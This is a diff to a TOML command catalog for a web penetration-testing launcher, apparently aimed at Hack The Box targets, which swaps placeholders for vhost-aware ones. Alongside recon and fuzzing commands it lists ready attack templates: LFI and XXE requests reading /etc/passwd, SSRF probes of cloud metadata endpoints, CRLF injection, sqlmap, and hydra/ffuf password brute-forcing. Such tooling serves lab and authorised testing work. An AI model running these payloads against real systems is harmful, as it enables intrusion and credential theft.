@@ -3,57 +3,79 @@ display_name = "Web"
 icon = "󰖟"
 order = 70
 
+# Placeholders:
+#   {web_host}   — hostname preferred (set target hostname to sub1.target.htb for that vhost)
+#   {vhost_root} — root domain for vhost/DNS fuzz (auto: sub1.target.htb → target.htb; override with -v)
+#   {ip}         — connect by IP (vhost fuzz: vary Host header while hitting the same IP)
+#   {target}     — IP preferred (legacy; SMB/AD commands — web commands use {web_host})
+
 [[command]]
 id = "web.whatweb"
 title = "whatweb"
-template = "whatweb http://{target}"
+template = "whatweb http://{web_host}"
 requires = ["whatweb"]
 tags = ["fingerprint"]
 
 [[command]]
 id = "web.curl.headers"
 title = "curl -I (headers)"
-template = "curl -kI http://{target}"
+template = "curl -kI http://{web_host}"
 requires = ["curl"]
 tags = ["headers"]
 
 [[command]]
 id = "web.curl.tls_headers"
 title = "curl -I https"
-template = "curl -kI https://{target}"
+template = "curl -kI https://{web_host}"
 requires = ["curl"]
 tags = ["headers", "https"]
 
 [[command]]
+id = "web.curl.headers.vhost_ip"
+title = "curl -I via IP + Host header"
+template = "curl -kI -H 'Host: {web_host}' http://{ip}/"
+requires = ["curl"]
+when = "target.has_ip && target.has_hostname"
+tags = ["headers", "vhost"]
+
+[[command]]
+id = "web.curl.tls_headers.vhost_ip"
+title = "curl -I https via IP + Host header"
+template = "curl -kI -H 'Host: {web_host}' https://{ip}/"
+requires = ["curl"]
+when = "target.has_ip && target.has_hostname"
+tags = ["headers", "vhost", "https"]
+
+[[command]]
 id = "web.feroxbuster.common"
 title = "feroxbuster (common)"
-template = "feroxbuster -u http://{target} -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,html,txt,js -t 50 -s 200,204,301,302,307,401,403"
+template = "feroxbuster -u http://{web_host} -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,html,txt,js -t 50 -s 200,204,301,302,307,401,403"
 requires = ["feroxbuster"]
 tags = ["fuzz", "dirbuster"]
 
 [[command]]
 id = "web.feroxbuster.deep"
 title = "feroxbuster — raft-medium"
-template = "feroxbuster -u http://{target} -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -t 100"
+template = "feroxbuster -u http://{web_host} -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -t 100"
 requires = ["feroxbuster"]
 tags = ["fuzz", "deep"]
 
 [[command]]
 id = "web.ffuf.dirs"
 title = "ffuf — directories"
-template = "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,307,401,403 -t 50"
+template = "ffuf -u http://{web_host}/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,307,401,403 -t 50"
 requires = ["ffuf"]
 tags = ["fuzz"]
 
-# Vhost fuzz: curl a non-existent Host (coffeedeadbeef.{hostname}) for body size, then ffuf -fs.
-# Set {hostname} on the target (e.g. app.htb). Edit GHOST= in the template if you need another junk name.
+# Vhost fuzz: curl a non-existent Host (coffeedeadbeef.{vhost_root}) for body size, then ffuf -fs.
+# Set {vhost_root} on the target (e.g. app.htb). Edit GHOST= in the template if you need another junk name.
 # Manual re-run: baseline prints size → chronosphere run -v vhost_fs=<bytes> … or use web.ffuf.vhost.manual
 
 [[command]]
 id = "web.ffuf.vhost.baseline"
 title = "ffuf vhost — baseline size (curl junk Host)"
-template = """GHOST=coffeedeadbeef; echo "[*] non-existent Host: ${GHOST}.{hostname}"; \\
-  SZ=$(curl -sk -H "Host: ${GHOST}.{hostname}" http://{target}/ | wc -c); \\
+template = """GHOST=coffeedeadbeef; echo "[*] non-existent Host: ${GHOST}.{vhost_root}"; \\
+  SZ=$(curl -sk -H "Host: ${GHOST}.{vhost_root}" http://{ip}/ | wc -c); \\
   echo "[*] baseline response size: ${SZ} bytes"; \\
   echo "[*] reuse: chronosphere run -v vhost_fs=${SZ} …  or run 'ffuf — vhost fuzz (manual -fs)'" """
 requires = ["curl"]
@@ -62,8 +84,8 @@ tags = ["fuzz", "vhost", "recon"]
 [[command]]
 id = "web.ffuf.vhost.baseline.https"
 title = "ffuf vhost — baseline size (https)"
-template = """GHOST=coffeedeadbeef; echo "[*] non-existent Host: ${GHOST}.{hostname}"; \\
-  SZ=$(curl -sk -H "Host: ${GHOST}.{hostname}" https://{target}/ | wc -c); \\
+template = """GHOST=coffeedeadbeef; echo "[*] non-existent Host: ${GHOST}.{vhost_root}"; \\
+  SZ=$(curl -sk -H "Host: ${GHOST}.{vhost_root}" https://{ip}/ | wc -c); \\
   echo "[*] baseline response size: ${SZ} bytes"; \\
   echo "[*] reuse: chronosphere run -v vhost_fs=${SZ} …" """
 requires = ["curl"]
@@ -72,132 +94,132 @@ tags = ["fuzz", "vhost", "recon", "https"]
 [[command]]
 id = "web.ffuf.vhost"
 title = "ffuf — vhost fuzz (baseline curl → -fs)"
-template = """bash -c 'GHOST=coffeedeadbeef; BASE="http://{target}/"; WL="/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"; \\
-  SZ=$(curl -sk -H "Host: ${GHOST}.{hostname}" "${BASE}" | wc -c); \\
-  echo "[*] baseline Host ${GHOST}.{hostname} → ${SZ} bytes (ffuf -fs ${SZ})"; \\
-  ffuf -u "${BASE}" -H "Host: FUZZ.{hostname}" -w "${WL}" -fs "${SZ}" -t 50'"""
+template = """bash -c 'GHOST=coffeedeadbeef; BASE="http://{ip}/"; WL="/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"; \\
+  SZ=$(curl -sk -H "Host: ${GHOST}.{vhost_root}" "${BASE}" | wc -c); \\
+  echo "[*] baseline Host ${GHOST}.{vhost_root} → ${SZ} bytes (ffuf -fs ${SZ})"; \\
+  ffuf -u "${BASE}" -H "Host: FUZZ.{vhost_root}" -w "${WL}" -fs "${SZ}" -t 50'"""
 requires = ["ffuf", "curl"]
 tags = ["fuzz", "vhost", "chain"]
 
 [[command]]
 id = "web.ffuf.vhost.https"
 title = "ffuf — vhost fuzz https (baseline curl → -fs)"
-template = """bash -c 'GHOST=coffeedeadbeef; BASE="https://{target}/"; WL="/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"; \\
-  SZ=$(curl -sk -H "Host: ${GHOST}.{hostname}" "${BASE}" | wc -c); \\
-  echo "[*] baseline Host ${GHOST}.{hostname} → ${SZ} bytes (ffuf -fs ${SZ})"; \\
-  ffuf -u "${BASE}" -H "Host: FUZZ.{hostname}" -w "${WL}" -fs "${SZ}" -t 50'"""
+template = """bash -c 'GHOST=coffeedeadbeef; BASE="https://{ip}/"; WL="/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"; \\
+  SZ=$(curl -sk -H "Host: ${GHOST}.{vhost_root}" "${BASE}" | wc -c); \\
+  echo "[*] baseline Host ${GHOST}.{vhost_root} → ${SZ} bytes (ffuf -fs ${SZ})"; \\
+  ffuf -u "${BASE}" -H "Host: FUZZ.{vhost_root}" -w "${WL}" -fs "${SZ}" -t 50'"""
 requires = ["ffuf", "curl"]
 tags = ["fuzz", "vhost", "chain", "https"]
 
 [[command]]
 id = "web.ffuf.vhost.manual"
 title = "ffuf — vhost fuzz (manual -fs; run baseline first)"
-template = "ffuf -u http://{target}/ -H 'Host: FUZZ.{hostname}' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs {vhost_fs} -t 50"
+template = "ffuf -u http://{ip}/ -H 'Host: FUZZ.{vhost_root}' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs {vhost_fs} -t 50"
 requires = ["ffuf"]
 tags = ["fuzz", "vhost"]
 
 [[command]]
 id = "web.ffuf.subdomain"
 title = "ffuf — subdomain fuzz"
-template = "ffuf -u http://FUZZ.{hostname} -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+template = "ffuf -u http://FUZZ.{vhost_root} -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
 requires = ["ffuf"]
 tags = ["fuzz", "subdomain"]
 
 [[command]]
 id = "web.ffuf.params"
 title = "ffuf — parameter fuzz"
-template = "ffuf -u 'http://{target}/page.php?FUZZ=test' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0"
+template = "ffuf -u 'http://{web_host}/page.php?FUZZ=test' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0"
 requires = ["ffuf"]
 tags = ["fuzz", "params"]
 
 [[command]]
 id = "web.gobuster.dirs"
 title = "gobuster dir"
-template = "gobuster dir -u http://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,asp,html,txt -t 50"
+template = "gobuster dir -u http://{web_host} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,asp,html,txt -t 50"
 requires = ["gobuster"]
 tags = ["fuzz", "dirbuster"]
 
 [[command]]
 id = "web.gobuster.dns"
 title = "gobuster dns"
-template = "gobuster dns -d {hostname} -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100"
+template = "gobuster dns -d {vhost_root} -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100"
 requires = ["gobuster"]
 tags = ["fuzz", "subdomain"]
 
 [[command]]
 id = "web.nikto"
 title = "nikto"
-template = "nikto -h http://{target} -ssl -nointeractive"
+template = "nikto -h http://{web_host} -ssl -nointeractive"
 requires = ["nikto"]
 tags = ["scanner", "vuln"]
 
 [[command]]
 id = "web.nuclei"
 title = "nuclei (default templates)"
-template = "nuclei -u http://{target} -severity medium,high,critical"
+template = "nuclei -u http://{web_host} -severity medium,high,critical"
 requires = ["nuclei"]
 tags = ["scanner", "vuln"]
 
 [[command]]
 id = "web.wpscan.full"
 title = "wpscan (full enumerate)"
-template = "wpscan --url http://{target} --enumerate ap,at,tt,cb,dbe,u,m --api-token YOUR_API_TOKEN"
+template = "wpscan --url http://{web_host} --enumerate ap,at,tt,cb,dbe,u,m --api-token YOUR_API_TOKEN"
 requires = ["wpscan"]
 tags = ["wordpress"]
 
 [[command]]
 id = "web.sqlmap.url"
 title = "sqlmap (URL)"
-template = "sqlmap -u 'http://{target}/page.php?id=1' --batch --risk=2 --level=3"
+template = "sqlmap -u 'http://{web_host}/page.php?id=1' --batch --risk=2 --level=3"
 requires = ["sqlmap"]
 tags = ["sqli"]
 
 [[command]]
 id = "web.sqlmap.dbs"
 title = "sqlmap — list databases"
-template = "sqlmap -u 'http://{target}/page.php?id=1' --batch --dbs"
+template = "sqlmap -u 'http://{web_host}/page.php?id=1' --batch --dbs"
 requires = ["sqlmap"]
 tags = ["sqli"]
 
 [[command]]
 id = "web.curl.lfi_payload"
 title = "curl LFI test"
-template = "curl -k 'http://{target}/index.php?page=../../../../etc/passwd'"
+template = "curl -k 'http://{web_host}/index.php?page=../../../../etc/passwd'"
 requires = ["curl"]
 tags = ["lfi"]
 
 [[command]]
 id = "web.curl.xxe_payload"
 title = "curl XXE proof"
-template = """curl -k -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>' http://{target}/api"""
+template = """curl -k -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>' http://{web_host}/api"""
 requires = ["curl"]
 tags = ["xxe"]
 
 [[command]]
 id = "web.dirsearch"
 title = "dirsearch"
-template = "dirsearch -u http://{target} -e php,asp,aspx,html,js -t 50"
+template = "dirsearch -u http://{web_host} -e php,asp,aspx,html,js -t 50"
 requires = ["dirsearch"]
 tags = ["fuzz"]
 
 [[command]]
 id = "web.katana.crawl"
 title = "katana crawl"
-template = "katana -u http://{target} -d 3 -jc -aff -kf all"
+template = "katana -u http://{web_host} -d 3 -jc -aff -kf all"
 requires = ["katana"]
 tags = ["crawl"]
 
 [[command]]
 id = "web.httpx.fingerprint"
 title = "httpx fingerprint + tech"
-template = "echo {target} | httpx -title -status-code -tech-detect -follow-redirects"
+template = "echo {web_host} | httpx -title -status-code -tech-detect -follow-redirects"
 requires = ["httpx"]
 tags = ["fingerprint"]
 
 [[command]]
 id = "web.gowitness.screenshot"
 title = "gowitness — screenshot"
-template = "gowitness single -u http://{target}"
+template = "gowitness single -u http://{web_host}"
 requires = ["gowitness"]
 tags = ["screenshot"]
 
@@ -206,7 +228,7 @@ tags = ["screenshot"]
 [[command]]
 id = "web.jwt_tool.scan"
 title = "jwt_tool — scan token"
-template = "jwt_tool 'TOKEN' -M at -t http://{target}"
+template = "jwt_tool 'TOKEN' -M at -t http://{web_host}"
 requires = ["jwt_tool"]
 tags = ["jwt"]
 
@@ -229,28 +251,28 @@ tags = ["jwt", "crack"]
 [[command]]
 id = "web.ssrf.aws_metadata"
 title = "SSRF probe: AWS metadata"
-template = "curl -k -gG 'http://{target}/proxy?url=http://169.254.169.254/latest/meta-data/' --max-time 10"
+template = "curl -k -gG 'http://{web_host}/proxy?url=http://169.254.169.254/latest/meta-data/' --max-time 10"
 requires = ["curl"]
 tags = ["ssrf", "cloud"]
 
 [[command]]
 id = "web.ssrf.gcp_metadata"
 title = "SSRF probe: GCP metadata"
-template = "curl -k -gG 'http://{target}/proxy?url=http://metadata.google.internal/computeMetadata/v1/' -H 'Metadata-Flavor: Google' --max-time 10"
+template = "curl -k -gG 'http://{web_host}/proxy?url=http://metadata.google.internal/computeMetadata/v1/' -H 'Metadata-Flavor: Google' --max-time 10"
 requires = ["curl"]
 tags = ["ssrf", "cloud"]
 
 [[command]]
 id = "web.ssrf.azure_metadata"
 title = "SSRF probe: Azure IMDS"
-template = "curl -k -gG 'http://{target}/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H 'Metadata: true' --max-time 10"
+template = "curl -k -gG 'http://{web_host}/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H 'Metadata: true' --max-time 10"
 requires = ["curl"]
 tags = ["ssrf", "cloud"]
 
 [[command]]
 id = "web.ssrf.localhost"
 title = "SSRF probe: localhost ports"
-template = "for port in 22 80 443 3000 5000 5432 6379 8080 8443 9200 27017; do curl -ks --max-time 3 -o /dev/null -w 'port='$port' code=%{{http_code}} time=%{{time_total}}\\n' \"http://{target}/proxy?url=http://127.0.0.1:$port\"; done"
+template = "for port in 22 80 443 3000 5000 5432 6379 8080 8443 9200 27017; do curl -ks --max-time 3 -o /dev/null -w 'port='$port' code=%{{http_code}} time=%{{time_total}}\\n' \"http://{web_host}/proxy?url=http://127.0.0.1:$port\"; done"
 requires = ["curl"]
 tags = ["ssrf", "internal"]
 
@@ -259,14 +281,14 @@ tags = ["ssrf", "internal"]
 [[command]]
 id = "web.crlf.basic"
 title = "CRLF injection probe"
-template = "curl -k -i 'http://{target}/?next=%0d%0aSet-Cookie:%20chrono=injected'"
+template = "curl -k -i 'http://{web_host}/?next=%0d%0aSet-Cookie:%20chrono=injected'"
 requires = ["curl"]
 tags = ["crlf"]
 
 [[command]]
 id = "web.smuggling.simple"
 title = "smuggler.py — request smuggling check"
-template = "smuggler.py -u http://{target}"
+template = "smuggler.py -u http://{web_host}"
 requires = ["smuggler.py"]
 tags = ["smuggling"]
 
@@ -275,42 +297,42 @@ tags = ["smuggling"]
 [[command]]
 id = "web.subfinder"
 title = "subfinder — passive subdomains"
-template = "subfinder -d {hostname} -all -recursive"
+template = "subfinder -d {vhost_root} -all -recursive"
 requires = ["subfinder"]
 tags = ["osint", "subdomain"]
 
 [[command]]
 id = "web.amass.passive"
 title = "amass — passive enum"
-template = "amass enum -passive -d {hostname}"
+template = "amass enum -passive -d {vhost_root}"
 requires = ["amass"]
 tags = ["osint", "subdomain"]
 
 [[command]]
 id = "web.waybackurls"
 title = "waybackurls — historical URLs"
-template = "echo {hostname} | waybackurls | tee wayback.txt | head -50"
+template = "echo {vhost_root} | waybackurls | tee wayback.txt | head -50"
 requires = ["waybackurls"]
 tags = ["osint", "history"]
 
 [[command]]
 id = "web.gau"
 title = "gau — all URLs from CommonCrawl/Wayback/OTX"
-template = "gau {hostname} | tee gau.txt | head -100"
+template = "gau {vhost_root} | tee gau.txt | head -100"
 requires = ["gau"]
 tags = ["osint"]
 
 [[command]]
 id = "web.assetfinder"
 title = "assetfinder — subdomain discovery"
-template = "assetfinder --subs-only {hostname}"
+template = "assetfinder --subs-only {vhost_root}"
 requires = ["assetfinder"]
 tags = ["osint", "subdomain"]
 
 [[command]]
 id = "web.dnsdumpster"
 title = "dnsdumpster (manual curl helper)"
-template = "curl -s 'https://dnsdumpster.com/' | grep -oE '[a-z0-9-]+\\.{hostname}' | sort -u"
+template = "curl -s 'https://dnsdumpster.com/' | grep -oE '[a-z0-9-]+\\.{vhost_root}' | sort -u"
 requires = ["curl"]
 tags = ["osint", "dns"]
 
@@ -319,21 +341,21 @@ tags = ["osint", "dns"]
 [[command]]
 id = "web.burp.curl_paste"
 title = "curl + Burp upstream proxy (paste cookies)"
-template = "curl -k --proxy http://127.0.0.1:8080 -b 'sess=...' http://{target}/api/me"
+template = "curl -k --proxy http://127.0.0.1:8080 -b 'sess=...' http://{web_host}/api/me"
 requires = ["curl"]
 tags = ["burp"]
 
 [[command]]
 id = "web.headers_security"
 title = "Inspect security headers"
-template = "curl -kI http://{target} | egrep -i 'strict-transport|content-security|x-frame|x-content-type|x-xss|referrer-policy|permissions-policy'"
+template = "curl -kI http://{web_host} | egrep -i 'strict-transport|content-security|x-frame|x-content-type|x-xss|referrer-policy|permissions-policy'"
 requires = ["curl"]
 tags = ["headers", "hardening"]
 
 [[command]]
 id = "web.cors.probe"
 title = "CORS — Origin echo probe"
-template = "curl -kI -H 'Origin: https://evil.com' http://{target}/api | egrep -i 'access-control'"
+template = "curl -kI -H 'Origin: https://evil.com' http://{web_host}/api | egrep -i 'access-control'"
 requires = ["curl"]
 tags = ["cors"]
 
@@ -342,13 +364,13 @@ tags = ["cors"]
 [[command]]
 id = "web.hydra.http_form"
 title = "hydra — HTTP form login"
-template = "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {target} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"
+template = "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {web_host} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"
 requires = ["hydra"]
 tags = ["bruteforce"]
 
 [[command]]
 id = "web.ffuf.login"
 title = "ffuf — login bruteforce (POST body)"
-template = "ffuf -u http://{target}/login -X POST -d 'user=admin&pass=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/wordlists/rockyou.txt -fc 401,403"
+template = "ffuf -u http://{web_host}/login -X POST -d 'user=admin&pass=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/wordlists/rockyou.txt -fc 401,403"
 requires = ["ffuf"]
 tags = ["bruteforce"]
